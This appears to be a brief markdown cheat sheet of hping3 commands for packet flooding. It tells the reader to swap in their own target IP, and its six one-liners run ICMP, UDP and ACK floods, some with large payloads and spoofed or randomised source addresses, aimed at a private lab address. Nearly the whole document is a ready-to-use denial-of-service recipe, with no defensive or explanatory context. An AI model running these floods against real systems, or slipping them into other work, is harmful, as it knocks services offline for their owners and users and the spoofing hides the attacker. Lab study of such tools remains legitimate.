# HPING3
### [Read](../manual/hping3.txt) hping3 manual 

### use your target ip instead
```bash
sudo hping3 --icmp --flood 192.168.247.131
```
```bash
sudo hping3 --icmp --flood --data 1200  192.168.247.131
```
```bash
sudo hping3 --icmp --flood --data 1200 --spoof 192.168.3.65  192.168.247.131
```
```bash
sudo hping3 --udp --flood -p 53   192.168.247.131 
```
```bash
sudo hping3 --ack --flood -p 21  192.168.247.131
```
```bash
sudo hping3 --icmp --flood --rand-source 192.168.247.131
```